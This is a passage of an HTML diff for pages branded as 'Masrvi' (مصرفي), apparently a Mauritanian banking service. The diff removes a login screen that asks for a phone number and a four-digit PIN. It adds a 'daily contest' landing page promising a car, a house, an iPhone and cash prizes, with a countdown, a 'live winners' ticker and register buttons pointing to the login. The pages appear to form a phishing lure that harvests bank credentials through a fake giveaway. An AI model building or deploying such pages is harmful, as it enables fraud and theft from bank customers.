@@ -2,426 +2,673 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title id="page-title">تسجيل الدخول</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مسابقة مصرفي اليومية</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
-    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
     :root {
-      --teal: #14C9A8; --teal-dark: #0fb898;
-      --bg: #ffffff; --bg-gray: #f4f5f7;
-      --text: #1a1a1a; --text-mid: #555; --text-light: #999;
-      --border: #e8e8e8; --red: #e53935;
+      --teal:#14C9A8; --teal-dark:#0CA88A; --teal-light:#3DDFC0;
+      --navy:#1B2B6B; --navy-dark:#0D1845; --navy-mid:#1e3275;
+      --white:#ffffff; --white-dim:rgba(255,255,255,.7);
+      --gold:#FFD166;
     }
-    html, body { height:100%; overflow:hidden; }
-    body { font-family:'Cairo',sans-serif; background:var(--bg); display:flex; flex-direction:column; height:100dvh; }
-
-    /* HEADER */
-    .header { display:flex; align-items:center; justify-content:space-between; padding:14px 20px; flex-shrink:0; }
-    .lang-btn { background:none; border:1.5px solid var(--teal); color:var(--teal); padding:5px 14px; border-radius:20px; font-family:'Cairo',sans-serif; font-size:13px; font-weight:700; cursor:pointer; transition:all .2s; }
-    .lang-btn:active { background:var(--teal); color:white; }
-    .back-btn { display:flex; align-items:center; gap:4px; background:none; border:none; font-family:'Cairo',sans-serif; font-size:16px; font-weight:600; color:var(--text); cursor:pointer; }
-    .back-arrow { font-size:20px; line-height:1; }
-
-    /* BODY */
-    .body-content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
-
-    /* LOGO */
-    .logo-wrap { display:flex; justify-content:center; align-items:center; padding:28px 20px 18px; }
-    .logo-wrap img { max-height:80px; max-width:220px; object-fit:contain; }
-    .logo-placeholder { display:none; flex-direction:column; align-items:center; gap:6px; }
-    .logo-placeholder .logo-box { width:68px; height:68px; border-radius:18px; background:linear-gradient(135deg,var(--teal),var(--teal-dark)); display:flex; align-items:center; justify-content:center; }
-    .logo-placeholder .logo-box span { font-size:32px; }
-    .logo-placeholder small { font-size:11px; color:var(--text-light); }
-
-    /* SCREEN 1 */
-    .screen-1 { padding:10px 24px 0; flex:1; }
-    .screen-title { font-size:30px; font-weight:800; color:var(--text); text-align:right; margin-bottom:28px; }
-    .field-label { font-size:14px; color:var(--text-light); text-align:right; margin-bottom:8px; }
-    .phone-row { display:flex; align-items:center; gap:10px; border-bottom:1.5px solid var(--border); padding-bottom:10px; margin-bottom:14px; }
-    .phone-input { flex:1; border:none; outline:none; font-family:'Cairo',sans-serif; font-size:22px; font-weight:700; color:var(--text); background:transparent; text-align:right; direction:ltr; letter-spacing:2px; }
-    .phone-input::placeholder { color:#d0d0d0; font-size:18px; letter-spacing:1px; font-weight:400; }
-    .code-box { display:flex; align-items:center; gap:8px; background:var(--bg-gray); border-radius:10px; padding:7px 12px; flex-shrink:0; }
-    .code-text { font-size:18px; font-weight:700; color:var(--text); }
-    .clear-x { width:22px; height:22px; border-radius:50%; background:#c5c5c5; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; color:white; font-size:11px; font-weight:700; }
-    .clear-x:active { background:#999; }
-    .forgot-link { color:var(--text-light); font-size:13px; text-align:right; cursor:pointer; text-decoration:underline; text-underline-offset:3px; margin-bottom:16px; }
-
-    /* BLOCK MESSAGE */
-    .block-msg {
-      background:#fff3f3; border:1.5px solid #ffcdd2; border-radius:12px;
-      padding:12px 16px; margin-bottom:12px; display:none;
+    html { scroll-behavior:smooth; }
+    body {
+      font-family:'Cairo',sans-serif;
+      background:var(--navy-dark);
+      color:var(--white);
+      overflow-x:hidden;
+      padding-bottom:86px;
     }
-    .block-msg .block-icon { font-size:20px; margin-bottom:4px; }
-    .block-msg .block-text { font-size:13px; color:var(--red); font-weight:600; line-height:1.5; }
-    .block-msg .block-timer { font-size:18px; font-weight:800; color:var(--red); margin-top:4px; }
+    ::-webkit-scrollbar { width:5px; }
+    ::-webkit-scrollbar-track { background:var(--navy-dark); }
+    ::-webkit-scrollbar-thumb { background:var(--teal-dark); border-radius:3px; }
 
-    /* BOTTOM */
-    .bottom-bar { background:var(--teal); padding:20px 22px 36px; flex-shrink:0; }
-    .primary-btn { width:100%; background:white; color:var(--text); border:none; border-radius:50px; padding:15px; font-family:'Cairo',sans-serif; font-size:17px; font-weight:700; cursor:pointer; transition:opacity .2s, transform .1s; }
-    .primary-btn:active { opacity:.85; transform:scale(.98); }
-    .primary-btn:disabled { opacity:.5; cursor:not-allowed; transform:none; }
+    #particles { position:fixed; inset:0; z-index:0; pointer-events:none; }
 
-    /* OVERLAY */
-    .overlay { position:fixed; inset:0; background:transparent; z-index:90; pointer-events:none; transition:background .35s; }
-    .overlay.active { background:rgba(0,0,0,.45); pointer-events:all; }
+    /* FIXED LANG */
+    .lang-float {
+      position:fixed; bottom:90px; right:20px; z-index:998;
+      background:linear-gradient(135deg,var(--navy),var(--navy-mid));
+      border:1.5px solid rgba(20,201,168,.5); border-radius:50%;
+      width:46px; height:46px;
+      display:flex; align-items:center; justify-content:center;
+      box-shadow:0 4px 16px rgba(0,0,0,.4), 0 0 12px rgba(20,201,168,.15);
+      cursor:pointer; font-size:22px;
+      transition:transform .15s;
+    }
+    .lang-float:active { transform:scale(.92); }
+    .lang-float-label {
+      position:fixed; bottom:90px; right:72px; z-index:998;
+      background:rgba(13,24,69,.92); border:1px solid rgba(20,201,168,.3);
+      border-radius:50px; padding:6px 14px;
+      font-family:'Cairo',sans-serif; font-size:13px; font-weight:800;
+      color:var(--teal); pointer-events:none;
+      opacity:0; transition:opacity .2s;
+    }
+    .lang-float:hover + .lang-float-label { opacity:1; }
 
-    /* PIN POPUP */
-    .pin-popup { position:fixed; bottom:-110%; left:0; right:0; background:var(--bg-gray); border-radius:24px 24px 0 0; z-index:100; transition:bottom .42s cubic-bezier(.32,1.25,.55,1); padding-bottom:20px; }
-    .pin-popup.active { bottom:0; }
-    .drag-bar { width:40px; height:4px; background:#ddd; border-radius:2px; margin:16px auto 0; }
-    .pin-header { padding:16px 22px 16px; text-align:center; }
-    .pin-instruction { font-size:15px; color:var(--text-light); margin-bottom:20px; }
-    .dots-row { display:flex; align-items:center; justify-content:center; gap:12px; }
-    .reset-btn { background:none; border:none; font-size:24px; color:#888; cursor:pointer; margin-left:8px; padding:4px; transition:color .15s; }
-    .reset-btn:active { color:var(--teal); }
-    .dot { width:14px; height:14px; border-radius:50%; background:#ddd; transition:background .18s, transform .18s; }
-    .dot.on { background:var(--teal); transform:scale(1.2); }
-
-    /* KEYPAD */
-    .keypad-wrap { background:white; border-radius:22px; margin:0 10px; padding:16px 14px; display:grid; grid-template-columns:repeat(4,1fr); gap:10px; box-shadow:0 2px 12px rgba(0,0,0,.06); }
-    .key { aspect-ratio:1; border-radius:50%; border:none; background:white; font-family:'Cairo',sans-serif; font-size:24px; font-weight:600; color:var(--text); cursor:pointer; display:flex; align-items:center; justify-content:center; box-shadow:0 2px 10px rgba(0,0,0,.07); transition:transform .1s, background .1s; user-select:none; }
-    .key:active { transform:scale(.88); background:#f0f0f0; }
-    .key.empty { background:transparent; box-shadow:none; cursor:default; border:1.5px dashed #ebebeb; }
-    .key.empty:active { transform:none; background:transparent; }
+    /* FIXED BOTTOM CTA */
+    .fixed-cta {
+      position:fixed; bottom:0; left:0; right:0; z-index:997;
+      background:linear-gradient(0deg, rgba(13,24,69,.98) 60%, transparent);
+      padding:14px 20px 18px;
+    }
+    .fixed-cta-btn {
+      width:100%; display:flex; align-items:center; justify-content:center; gap:12px;
+      background:linear-gradient(135deg,var(--teal),var(--teal-dark));
+      color:var(--white); border:none; border-radius:50px;
+      padding:16px; font-family:'Cairo',sans-serif;
+      font-size:18px; font-weight:900; cursor:pointer;
+      box-shadow:0 0 30px rgba(20,201,168,.4), 0 6px 20px rgba(0,0,0,.4);
+      animation:glowPulse 2.5s ease-in-out infinite;
+      transition:transform .15s;
+    }
+    .fixed-cta-btn:active { transform:scale(.97); }
+    @keyframes glowPulse {
+      0%,100%{ box-shadow:0 0 30px rgba(20,201,168,.4),0 6px 20px rgba(0,0,0,.4); }
+      50%{ box-shadow:0 0 55px rgba(20,201,168,.7),0 6px 20px rgba(0,0,0,.4); }
+    }
 
     /* SPINNER */
-    .spinner-screen { position:fixed; inset:0; background:rgba(255,255,255,.92); z-index:200; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:18px; opacity:0; pointer-events:none; transition:opacity .25s; }
-    .spinner-screen.active { opacity:1; pointer-events:all; }
-    .ring { width:52px; height:52px; border:4px solid #e8e8e8; border-top-color:var(--teal); border-radius:50%; animation:spin .75s linear infinite; }
-    @keyframes spin { to { transform:rotate(360deg); } }
-    .spin-label { font-size:15px; color:var(--text-mid); }
+    .spinner-overlay {
+      position:fixed; inset:0; z-index:9999;
+      background:linear-gradient(135deg,var(--navy-dark),var(--navy));
+      display:flex; flex-direction:column; align-items:center; justify-content:center; gap:22px;
+      opacity:0; pointer-events:none; transition:opacity .3s;
+    }
+    .spinner-overlay.active { opacity:1; pointer-events:all; }
+    .spin-logo { width:72px; height:72px; border-radius:50%; overflow:hidden; border:3px solid rgba(20,201,168,.4); }
+    .spin-logo img { width:100%; height:100%; object-fit:cover; }
+    .spin-ring { width:56px; height:56px; border:4px solid rgba(20,201,168,.2); border-top-color:var(--teal); border-radius:50%; animation:spin .8s linear infinite; }
+    @keyframes spin { to{transform:rotate(360deg)} }
+    .spin-text { font-size:15px; color:var(--white-dim); }
 
-    /* FR */
-    body.fr .screen-title, body.fr .field-label, body.fr .forgot-link { text-align:left; }
-    body.fr .phone-row { flex-direction:row; direction:ltr; }
-    body.fr .phone-input { text-align:left; }
-    body.fr .back-arrow { transform:scaleX(-1); display:inline-block; }
-    body.fr .block-msg .block-text { text-align:left; }
+    /* HEADER */
+    .site-header {
+      position:fixed; top:0; left:0; right:0; z-index:100;
+      padding:12px 20px;
+      display:flex; align-items:center; justify-content:center;
+      background:linear-gradient(180deg,rgba(13,24,69,.92) 0%,transparent 100%);
+      backdrop-filter:blur(6px);
+    }
+    .header-logo img.logo-main { height:42px; object-fit:contain; }
+
+    /* HERO */
+    .hero {
+      position:relative; min-height:100vh;
+      display:flex; flex-direction:column;
+      align-items:center; justify-content:flex-end;
+      padding:100px 22px 40px; overflow:hidden;
+    }
+    .hero-bg { position:absolute; inset:0; z-index:0; background:linear-gradient(160deg,var(--navy-dark) 0%,var(--navy) 50%,var(--navy-dark) 100%); }
+    .hero-bg-img { position:absolute; inset:0; z-index:1; background-image:url('images/hero_bg.png'); background-size:cover; background-position:center top; opacity:0.22; }
+    .hero-bg-overlay {
+      position:absolute; inset:0; z-index:2;
+      background:
+        linear-gradient(180deg, rgba(13,24,69,.65) 0%, rgba(13,24,69,.2) 40%, rgba(13,24,69,.7) 80%, rgba(13,24,69,.98) 100%),
+        linear-gradient(90deg, rgba(13,24,69,.4) 0%, transparent 50%, rgba(13,24,69,.4) 100%);
+    }
+    .geo-ring { position:absolute; border-radius:50%; border:1px solid rgba(20,201,168,.08); z-index:3; }
+    .geo-ring.r1 { width:500px; height:500px; top:-150px; right:-100px; }
+    .geo-ring.r2 { width:300px; height:300px; bottom:-80px; left:-60px; }
+    .fdot { position:absolute; border-radius:50%; background:var(--teal); z-index:3; animation:floatDot 4s ease-in-out infinite; }
+    .fdot.d1 { width:6px; height:6px; top:22%; right:18%; animation-delay:0s; }
+    .fdot.d2 { width:5px; height:5px; top:55%; left:12%; animation-delay:1.4s; }
+    .fdot.d3 { width:7px; height:7px; top:75%; right:28%; animation-delay:2.8s; }
+    @keyframes floatDot { 0%,100%{ transform:translateY(0) scale(1); opacity:.5; } 50%{ transform:translateY(-14px) scale(1.5); opacity:1; } }
+
+    .hero-logo-wrap { position:relative; z-index:4; text-align:center; margin-bottom:24px; animation:heroIn .8s ease both; }
+    .hero-logo-wrap img { max-width:260px; height:auto; object-fit:contain; filter:drop-shadow(0 4px 20px rgba(20,201,168,.3)); }
+
+    .hero-inner { position:relative; z-index:4; text-align:center; max-width:500px; width:100%; animation:heroIn .8s .1s ease both; }
+    @keyframes heroIn { from{ opacity:0; transform:translateY(28px); } to{ opacity:1; transform:translateY(0); } }
+
+    .contest-badge {
+      display:inline-flex; align-items:center; gap:8px;
+      background:linear-gradient(135deg,rgba(20,201,168,.15),rgba(20,201,168,.05));
+      border:1px solid rgba(20,201,168,.35); border-radius:50px;
+      padding:7px 20px; font-size:13px; font-weight:700; color:var(--teal);
+      margin-bottom:18px;
+    }
+
+    .hero-title { font-size:clamp(26px,7.5vw,44px); font-weight:900; line-height:1.2; margin-bottom:14px; }
+    .hero-title .t1 { display:block; color:var(--white); }
+    .hero-title .t2 { display:block; background:linear-gradient(90deg,var(--teal-light),var(--teal),var(--teal-dark)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+
+    .hero-sub { font-size:14px; color:var(--white-dim); line-height:1.8; margin-bottom:26px; }
+
+    /* NEXT DRAW BOX */
+    .next-draw-box {
+      display:flex; align-items:center; justify-content:center; gap:14px;
+      background:rgba(255,255,255,.05); border:1px solid rgba(20,201,168,.25);
+      border-radius:18px; padding:14px 20px; margin-bottom:22px;
+    }
+    .nd-icon { font-size:28px; }
+    .nd-text { text-align:right; }
+    .nd-label { font-size:12px; color:var(--white-dim); font-weight:600; }
+    .nd-value { font-size:18px; font-weight:900; color:var(--teal); }
+
+    /* COUNTDOWN */
+    .countdown { display:flex; gap:10px; justify-content:center; margin-bottom:28px; }
+    .cd-box { background:rgba(255,255,255,.06); border:1px solid rgba(20,201,168,.2); border-radius:16px; padding:12px 14px; min-width:66px; text-align:center; }
+    .cd-num { font-size:28px; font-weight:900; background:linear-gradient(180deg,var(--teal-light),var(--teal)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; line-height:1; }
+    .cd-lbl { font-size:11px; color:var(--white-dim); margin-top:4px; font-weight:600; }
+    .cd-sep { font-size:26px; font-weight:900; color:var(--teal); align-self:center; margin-top:-10px; animation:blink 1s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.1} }
+
+    .motive-row { display:flex; flex-wrap:wrap; gap:10px; justify-content:center; margin-bottom:26px; }
+    .mpill { display:flex; align-items:center; gap:7px; background:rgba(255,255,255,.06); border:1px solid rgba(20,201,168,.25); border-radius:50px; padding:7px 15px; font-size:13px; font-weight:700; color:var(--white); }
+    .mpill .mpv { background:linear-gradient(90deg,var(--teal-light),var(--teal)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; font-weight:900; }
+
+    .hero-cta { display:inline-flex; align-items:center; gap:10px; background:linear-gradient(135deg,var(--teal),var(--teal-dark)); color:var(--white); border:none; border-radius:50px; padding:16px 44px; font-family:'Cairo',sans-serif; font-size:17px; font-weight:900; cursor:pointer; box-shadow:0 0 30px rgba(20,201,168,.35), 0 6px 20px rgba(0,0,0,.4); animation:glowPulse 2.5s .8s ease-in-out infinite; }
+    .hero-cta:active { transform:scale(.96); }
+
+    /* TICKER */
+    .ticker-wrap { position:sticky; top:66px; z-index:50; background:linear-gradient(90deg,rgba(13,24,69,.97),rgba(27,43,107,.97)); border-top:1px solid rgba(20,201,168,.2); border-bottom:1px solid rgba(20,201,168,.2); padding:9px 0; overflow:hidden; }
+    .tk-badge { position:absolute; right:0; top:0; bottom:0; z-index:2; display:flex; align-items:center; padding:0 14px; background:linear-gradient(90deg,transparent,rgba(13,24,69,1) 35%); gap:7px; white-space:nowrap; }
+    .tk-dot { width:7px; height:7px; border-radius:50%; background:#ff4444; animation:blink .8s infinite; }
+    .tk-lbl { font-size:11px; font-weight:800; color:var(--teal); }
+    .ticker-inner { display:flex; white-space:nowrap; animation:tkMove 65s linear infinite; }
+    @keyframes tkMove { from{transform:translateX(0)} to{transform:translateX(-50%)} }
+    .ti { display:inline-flex; align-items:center; gap:10px; padding:0 26px; border-right:1px solid rgba(20,201,168,.15); }
+    .ti-name { font-size:13px; font-weight:700; }
+    .ti-phone { font-size:12px; color:var(--white-dim); direction:ltr; }
+    .ti-amount { font-size:13px; font-weight:900; color:var(--teal); }
+
+    /* SECTIONS */
+    .page-sec { max-width:560px; margin:0 auto; padding:52px 20px; position:relative; z-index:2; }
+    .sec-head { text-align:center; margin-bottom:30px; }
+    .sec-tag { display:inline-block; background:linear-gradient(135deg,rgba(20,201,168,.15),rgba(20,201,168,.05)); border:1px solid rgba(20,201,168,.3); border-radius:50px; padding:5px 18px; font-size:12px; font-weight:700; color:var(--teal); margin-bottom:10px; }
+    .sec-title { font-size:23px; font-weight:900; color:var(--white); line-height:1.3; }
+    .sec-title span { background:linear-gradient(90deg,var(--teal-light),var(--teal)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+    .teal-bar { width:48px; height:3px; margin:10px auto 0; background:linear-gradient(90deg,var(--teal),var(--teal-dark)); border-radius:2px; }
+    .divider { height:1px; margin:0 20px; background:linear-gradient(90deg,transparent,rgba(20,201,168,.2),transparent); }
+
+    /* PRIZES */
+    .grand-cards { display:flex; flex-direction:column; gap:14px; margin-bottom:16px; }
+    .grand-card { border-radius:22px; overflow:hidden; border:1px solid rgba(20,201,168,.25); background:linear-gradient(160deg,rgba(27,43,107,.6),rgba(13,24,69,.9)); }
+    .gcard-img { width:100%; height:188px; background:linear-gradient(135deg,rgba(20,201,168,.07),rgba(13,24,69,.6)); display:flex; flex-direction:column; align-items:center; justify-content:center; position:relative; overflow:hidden; border-bottom:1px solid rgba(20,201,168,.15); }
+    .gcard-img::before { content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,rgba(20,201,168,.03) 0,rgba(20,201,168,.03) 1px,transparent 1px,transparent 14px); }
+    .gcard-img img { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }
+    .gcard-img .gi-icon { font-size:48px; position:relative; z-index:1; filter:drop-shadow(0 4px 12px rgba(20,201,168,.3)); }
+    .gcard-img .gi-hint { font-size:11px; color:rgba(20,201,168,.5); font-weight:600; position:relative; z-index:1; margin-top:6px; }
+    .gcard-body { padding:18px 20px; }
+    .gbadge { display:inline-flex; align-items:center; gap:6px; background:linear-gradient(135deg,var(--teal),var(--teal-dark)); border-radius:50px; padding:4px 14px; font-size:11px; font-weight:800; color:var(--white); margin-bottom:10px; }
+    .gcard-name { font-size:20px; font-weight:900; color:var(--white); margin-bottom:4px; }
+    .gcard-desc { font-size:13px; color:var(--white-dim); line-height:1.6; }
+
+    .prize-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+    .prize-card { border-radius:18px; overflow:hidden; border:1px solid rgba(20,201,168,.15); background:linear-gradient(160deg,rgba(27,43,107,.5),rgba(13,24,69,.9)); }
+    .pimg { width:100%; height:118px; background:linear-gradient(135deg,rgba(20,201,168,.06),rgba(13,24,69,.7)); display:flex; flex-direction:column; align-items:center; justify-content:center; position:relative; overflow:hidden; border-bottom:1px solid rgba(20,201,168,.1); }
+    .pimg::before { content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,rgba(20,201,168,.02) 0,rgba(20,201,168,.02) 1px,transparent 1px,transparent 10px); }
+    .pimg img { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }
+    .pimg .pi-icon { font-size:34px; position:relative; z-index:1; filter:drop-shadow(0 3px 8px rgba(20,201,168,.25)); }
+    .pimg .pi-hint { font-size:10px; color:rgba(20,201,168,.4); font-weight:600; position:relative; z-index:1; margin-top:4px; }
+    .pbody { padding:12px; }
+    .pbody .pname { font-size:14px; font-weight:800; color:var(--white); margin-bottom:3px; }
+    .pbody .pdesc { font-size:12px; color:var(--white-dim); }
+    .pbody .ptag { display:inline-block; margin-top:6px; background:rgba(20,201,168,.1); border:1px solid rgba(20,201,168,.2); border-radius:50px; padding:2px 10px; font-size:11px; font-weight:700; color:var(--teal); }
+
+    /* SLIDESHOW */
+    .slideshow-wrap { position:relative; border-radius:22px; overflow:hidden; }
+    .slides-cont { display:flex; transition:transform .5s cubic-bezier(.4,0,.2,1); }
+    .slide { min-width:100%; height:228px; background:linear-gradient(135deg,rgba(20,201,168,.07),rgba(13,24,69,.8)); display:flex; flex-direction:column; align-items:center; justify-content:center; border:1px solid rgba(20,201,168,.15); border-radius:22px; overflow:hidden; position:relative; }
+    .slide::before { content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,rgba(20,201,168,.02) 0,rgba(20,201,168,.02) 1px,transparent 1px,transparent 14px); }
+    .slide img { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }
+    .slide .s-icon { font-size:42px; position:relative; z-index:1; }
+    .slide .s-hint { font-size:12px; color:rgba(20,201,168,.5); font-weight:700; position:relative; z-index:1; margin-top:6px; }
+    .slide-nav { position:absolute; bottom:12px; left:50%; transform:translateX(-50%); display:flex; gap:8px; z-index:2; }
+    .sdot { width:8px; height:8px; border-radius:50%; background:rgba(255,255,255,.25); cursor:pointer; transition:all .2s; }
+    .sdot.on { background:var(--teal); transform:scale(1.3); }
+    .sarr { position:absolute; top:50%; transform:translateY(-50%); width:38px; height:38px; border-radius:50%; background:rgba(13,24,69,.75); backdrop-filter:blur(4px); border:1px solid rgba(20,201,168,.3); display:flex; align-items:center; justify-content:center; color:var(--teal); font-size:20px; cursor:pointer; z-index:2; transition:background .2s; }
+    .sarr:active { background:rgba(20,201,168,.2); }
+    .sarr.prev { right:12px; }
+    .sarr.next { left:12px; }
+
+    /* LIVE FEED */
+    .feed-item { display:flex; align-items:center; gap:12px; padding:13px 15px; border-radius:16px; border:1px solid rgba(20,201,168,0); background:rgba(255,255,255,.03); margin-bottom:10px; transition:all .4s; }
+    .feed-item.new { border-color:rgba(20,201,168,.25); background:linear-gradient(135deg,rgba(27,43,107,.5),rgba(13,24,69,.9)); animation:feedIn .5s ease; }
+    @keyframes feedIn { from{opacity:0;transform:translateX(14px) scale(.97)} to{opacity:1;transform:translateX(0) scale(1)} }
+    .favatar { width:44px; height:44px; border-radius:50%; flex-shrink:0; background:linear-gradient(135deg,var(--teal-dark),var(--navy-mid)); display:flex; align-items:center; justify-content:center; font-size:20px; border:2px solid rgba(20,201,168,.3); }
+    .finfo { flex:1; }
+    .fname { font-size:14px; font-weight:700; }
+    .fphone { font-size:12px; color:var(--white-dim); direction:ltr; display:inline-block; }
+    .famount { text-align:left; white-space:nowrap; }
+    .fa-num { font-size:16px; font-weight:900; color:var(--teal); }
+    .fa-unit { font-size:11px; color:var(--white-dim); }
+
+    /* BOTTOM CTA */
+    .bottom-cta { text-align:center; padding:46px 20px 20px; position:relative; z-index:2; }
+    .bc-title { font-size:clamp(20px,5.5vw,30px); font-weight:900; margin-bottom:12px; }
+    .bc-title span { background:linear-gradient(90deg,var(--teal-light),var(--teal)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+    .bc-sub { font-size:14px; color:var(--white-dim); margin-bottom:26px; line-height:1.7; }
+
+    footer { text-align:center; padding:18px; border-top:1px solid rgba(20,201,168,.1); font-size:12px; color:var(--white-dim); position:relative; z-index:2; }
+
+    /* FR MODE */
+    body.fr .tk-badge { right:auto; left:0; background:linear-gradient(270deg,transparent,rgba(13,24,69,1) 35%); }
+    body.fr .sarr.prev { right:auto; left:12px; }
+    body.fr .sarr.next { left:auto; right:12px; }
+    body.fr .lang-float { right:auto; left:20px; }
+    body.fr .lang-float-label { right:auto; left:72px; }
+    body.fr .nd-text { text-align:left; }
   </style>
 </head>
 <body>
 
-<header class="header">
-  <button class="lang-btn" id="lang-btn" onclick="toggleLang()">FR</button>
-  <button class="back-btn" onclick="goBack()">
-    <span id="back-text">رجوع</span>
-    <span class="back-arrow">›</span>
+<canvas id="particles"></canvas>
+
+<button class="lang-float" id="lang-btn" onclick="toggleLang()" title="Language / اللغة">🌐</button>
+<div class="lang-float-label" id="lang-float-label">FR</div>
+
+<div class="fixed-cta">
+  <button class="fixed-cta-btn" onclick="goLogin()">
+    
+    <span id="fixed-cta-text">سجّل الآن وشارك في السحب اليومي</span>
   </button>
+</div>
+
+<div class="spinner-overlay" id="spinner-ov">
+  <div class="spin-logo"><img src="images/logo1.png" alt=""></div>
+  <div class="spin-ring"></div>
+  <div class="spin-text" id="spin-txt">جاري التوجيه...</div>
+</div>
+
+<header class="site-header">
+  <div class="header-logo">
+    <img class="logo-main" src="images/logo2.png" alt="مصرفي" onerror="this.src='images/logo.png'">
+  </div>
 </header>
 
-<div class="body-content">
-  <div class="logo-wrap">
-    <img src="images/logo1.png" alt="Logo" onerror="this.style.display='none'; document.getElementById('logo-ph').style.display='flex';">
-    <div class="logo-placeholder" id="logo-ph">
-      <div class="logo-box"><span></span></div>
-      <small>logo.png</small>
-    </div>
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-bg-img"></div>
+  <div class="hero-bg-overlay"></div>
+  <div class="geo-ring r1"></div>
+  <div class="geo-ring r2"></div>
+  <div class="fdot d1"></div>
+  <div class="fdot d2"></div>
+  <div class="fdot d3"></div>
+
+  <div class="hero-logo-wrap">
+    <img src="images/logo2.png" alt="مصرفي Masrvi" onerror="this.src='images/logo.png'">
   </div>
 
-  <div class="screen-1">
-    <div class="screen-title" id="s-title">الاتصال</div>
-    <div class="field-label" id="s-phone-label">رقم الهاتف</div>
-    <div class="phone-row">
-      <div class="code-box">
-        <button class="clear-x" onclick="clearPhone()">✕</button>
-        <span class="code-text">222</span>
+  <div class="hero-inner">
+    <div class="contest-badge"><span id="h-badge">مسابقة مصرفي اليومية</span></div>
+    <h1 class="hero-title">
+      <span class="t1" id="h-t1">جوائز مصرفي الكبرى</span>
+      <span class="t2" id="h-t2">اربح كل يوم مع مصرفي</span>
+    </h1>
+    <p class="hero-sub" id="h-sub">سيارة فارهة • منزل فاخر • iPhone 17 Pro • جوائز نقدية يومية تصل إلى 35.000 أوقية</p>
+
+    <!-- NEXT DRAW COUNTDOWN -->
+    <div class="next-draw-box">
+      
+      <div class="nd-text">
+        <div class="nd-label" id="nd-label">السحب القادم خلال</div>
+        <div class="nd-value" id="nd-value">--:--:--</div>
       </div>
-      <input type="tel" id="phone-input" class="phone-input" maxlength="8" inputmode="numeric" placeholder="XX XX XX XX" oninput="onPhone(this)">
     </div>
-    <div class="forgot-link" id="s-forgot">لم يعد بإمكاني الوصول إلى رقمي</div>
 
-    <!-- BLOCK MESSAGE -->
-    <div class="block-msg" id="block-msg">
-      <div class="block-icon">🚫</div>
-      <div class="block-text" id="block-text"></div>
-      <div class="block-timer" id="block-timer"></div>
+    <div class="countdown">
+      <div class="cd-box"><div class="cd-num" id="cd-h">00</div><div class="cd-lbl" id="cd-hl">ساعة</div></div>
+      <div class="cd-sep">:</div>
+      <div class="cd-box"><div class="cd-num" id="cd-m">00</div><div class="cd-lbl" id="cd-ml">دقيقة</div></div>
+      <div class="cd-sep">:</div>
+      <div class="cd-box"><div class="cd-num" id="cd-s">00</div><div class="cd-lbl" id="cd-sl">ثانية</div></div>
     </div>
-  </div>
 
-  <div class="bottom-bar">
-    <button class="primary-btn" id="act-btn" disabled onclick="tryOpenPin()">
-      <span id="s-btn">تفعيل الاتصال</span>
+    <div class="motive-row">
+      <div class="mpill"><span id="mp1">أكبر مسابقة في موريتانيا</span></div>
+      <div class="mpill"><span id="mp2">جوائز يومية <span class="mpv">35.000</span> أوقية</span></div>
+      <div class="mpill"><span id="mp3">تسجيل في ثوانٍ</span></div>
+      <div class="mpill"><span id="mp4">فرصتك مع مصرفي</span></div>
+    </div>
+
+    <button class="hero-cta" onclick="goLogin()">
+      <span id="h-cta">سجّل الآن</span>
     </button>
   </div>
+</section>
+
+<div class="ticker-wrap">
+  <div class="tk-badge"><div class="tk-dot"></div><span class="tk-lbl" id="tk-lbl">رابحون مباشر</span></div>
+  <div class="ticker-inner" id="ticker-inner"></div>
 </div>
 
-<div class="overlay" id="overlay" onclick="closePin()"></div>
-
-<div class="pin-popup" id="pin-popup">
-  <div class="drag-bar"></div>
-  <div class="pin-header">
-    <div class="pin-instruction" id="s-pin-hint">أدخل الرمز لكي تواصل</div>
-    <div class="dots-row">
-      <button class="reset-btn" onclick="resetPin()">↺</button>
-      <div class="dot" id="d0"></div>
-      <div class="dot" id="d1"></div>
-      <div class="dot" id="d2"></div>
-      <div class="dot" id="d3"></div>
+<!-- PRIZES -->
+<div class="page-sec">
+  <div class="sec-head">
+    <div class="sec-tag" id="pr-tag">الجوائز</div>
+    <div class="sec-title" id="pr-title">جوائز <span>مصرفي</span> الأسطورية</div>
+    <div class="teal-bar"></div>
+  </div>
+  <div class="grand-cards">
+    <div class="grand-card">
+      <div class="gcard-img">
+        <img src="images/prize_car.png" alt="" onerror="this.style.display='none'">
+      </div>
+      <div class="gcard-body">
+        <div class="gbadge"><span id="gp1b">الجائزة الكبرى الأولى</span></div>
+        <div class="gcard-name" id="gp1n">سيارة فارهة</div>
+        <div class="gcard-desc" id="gp1d">سيارة فاخرة تُسلَّم للفائز في حفل مصرفي الشهري الاحتفالي</div>
+      </div>
+    </div>
+    <div class="grand-card">
+      <div class="gcard-img">
+        <img src="images/prize_house.png" alt="" onerror="this.style.display='none'">
+      </div>
+      <div class="gcard-body">
+        <div class="gbadge"><span id="gp2b">الجائزة الكبرى الثانية</span></div>
+        <div class="gcard-name" id="gp2n">منزل فاخر</div>
